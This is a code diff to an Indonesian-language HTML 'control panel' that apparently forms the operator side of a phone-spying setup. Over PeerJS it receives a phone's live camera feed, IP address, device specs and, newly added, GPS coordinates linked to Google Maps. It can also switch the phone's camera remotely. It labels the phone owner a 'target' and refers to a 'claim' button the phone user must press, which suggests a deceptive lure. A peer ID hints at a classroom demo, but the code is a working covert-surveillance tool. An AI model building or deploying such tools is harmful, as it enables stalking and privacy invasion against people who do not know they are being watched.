@@ -2,24 +2,29 @@
 <html lang="id">
 <head>
   <meta charset="UTF-8">
-  <title>Panel Kontrol Kamera (Laptop)</title>
+  <title>Panel Kontrol Kamera & Informasi Target</title>
   <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
   <style>
-    body { font-family: sans-serif; text-align: center; background: #222; color: white; padding: 20px; }
-    video { width: 80%; max-width: 600px; border-radius: 10px; border: 2px solid #00ffcc; margin-top: 15px; }
-    button { padding: 12px 24px; font-size: 16px; background: #007bff; color: white; border: none; border-radius: 5px; cursor: pointer; font-weight: bold; }
+    body { font-family: sans-serif; text-align: center; background: #1a1a1a; color: white; padding: 20px; }
+    video { width: 90%; max-width: 640px; border-radius: 10px; border: 2px solid #00ffcc; margin-top: 15px; background: #000; }
+    button { padding: 12px 24px; font-size: 16px; background: #007bff; color: white; border: none; border-radius: 6px; cursor: pointer; font-weight: bold; }
     button:hover { background: #0056b3; }
-    #infoBox { background: #333; margin: 15px auto; padding: 15px; border-radius: 8px; max-width: 600px; color: #00ffcc; font-family: monospace; text-align: left; line-height: 1.6; word-break: break-all; }
+    .container { max-width: 700px; margin: 0 auto; }
+    #infoBox { background: #2d2d2d; margin: 15px auto; padding: 15px; border-radius: 8px; color: #00ffcc; font-family: monospace; text-align: left; line-height: 1.6; word-break: break-all; border-left: 5px solid #00ffcc; }
+    .btn-maps { display: inline-block; margin-top: 10px; padding: 10px 18px; background: #28a745; color: white; border-radius: 6px; text-decoration: none; font-weight: bold; font-family: sans-serif; }
+    .btn-maps:hover { background: #218838; }
   </style>
 </head>
 <body>
-  <h2>Layar Pantau Kamera HP (Live)</h2>
-  <button id="switchBtn">🔄 Ganti Kamera (Depan / Belakang)</button> <br>
-  
-  <!-- Kotak Informasi IP & Spesifikasi HP -->
-  <div id="infoBox">Status: Menunggu koneksi dari HP...</div>
+  <div class="container">
+    <h2>Layar Pantau Kamera & Data Target (Live)</h2>
+    <button id="switchBtn">🔄 Ganti Kamera (Depan / Belakang)</button> <br>
+    
+    <!-- Kotak Panel Informasi -->
+    <div id="infoBox">Status: Menunggu koneksi dari HP...</div>
 
-  <video id="remoteVideo" autoplay playsinline muted></video>
+    <video id="remoteVideo" autoplay playsinline muted></video>
+  </div>
 
   <script>
     const ID_LAPTOP = "guru-demo-kamera-123";
@@ -37,6 +42,7 @@
     let activeDataConn = null;
     let ipTargetInfo = "Mencari IP...";
     let deviceInfoText = "Menunggu data perangkat...";
+    let mapsButtonHtml = "<br><span style='color:#aaa;'>(Menunggu izin lokasi dari HP...)</span>";
 
     function updateDisplay() {
       const infoBox = document.getElementById('infoBox');
@@ -44,11 +50,12 @@
         <strong>🌐 KONEKSI JARINGAN:</strong><br>
         ${ipTargetInfo}<br><br>
         <strong>📱 SPESIFIKASI PERANGKAT HP:</strong><br>
-        ${deviceInfoText}
+        ${deviceInfoText}<br>
+        ${mapsButtonHtml}
       `;
     }
 
-    // 1. Menangkap siaran video dari HP & mendeteksi Alamat IP
+    // 1. Menangkap Streaming Video & Alamat IP
     peer.on('call', (call) => {
       call.answer();
       call.on('stream', (remoteStream) => {
@@ -67,29 +74,40 @@
       });
     });
 
-    // 2. Menangkap data profil spesifikasi HP
+    // 2. Menangkap Data Spesifikasi & Koordinat GPS dari HP
     peer.on('connection', (conn) => {
       activeDataConn = conn;
 
       conn.on('data', (data) => {
+        // Menerima Spesifikasi Perangkat
         if (data.type === 'device-info') {
           deviceInfoText = `
             • OS & Peramban: ${data.osBrowser}<br>
-            • Resolusi Layar: ${data.resolusi}<br>
-            • Inti CPU: ${data.cpuCore} Core | Estimasi RAM: ${data.ram}<br>
+            • Layar: ${data.resolusi}<br>
+            • CPU: ${data.cpuCore} Core | Estimasi RAM: ${data.ram}<br>
             • Zona Waktu: ${data.zonaWaktu}
+          `;
+          updateDisplay();
+        }
+
+        // Menerima Koordinat GPS & Menampilkan Tombol Maps di Bawah Zona Waktu
+        if (data.type === 'location-info') {
+          mapsButtonHtml = `
+            <a href="${data.mapsUrl}" target="_blank" class="btn-maps">
+              🗺️ Buka Google Maps Lokasi HP
+            </a>
           `;
           updateDisplay();
         }
       });
     });
 
-    // 3. Perintah tombol ganti kamera
+    // 3. Perintah Tombol Ganti Kamera
     document.getElementById('switchBtn').addEventListener('click', () => {
       if (activeDataConn && activeDataConn.open) {
         activeDataConn.send('switch');
       } else {
-        alert("HP belum terhubung! Buka link di HP dan tekan tombol klaim terlebih dahulu.");
+        alert("HP belum terhubung! Pastikan link HP sudah dibuka dan tombol klaim sudah ditekan.");
       }
     });
   </script>
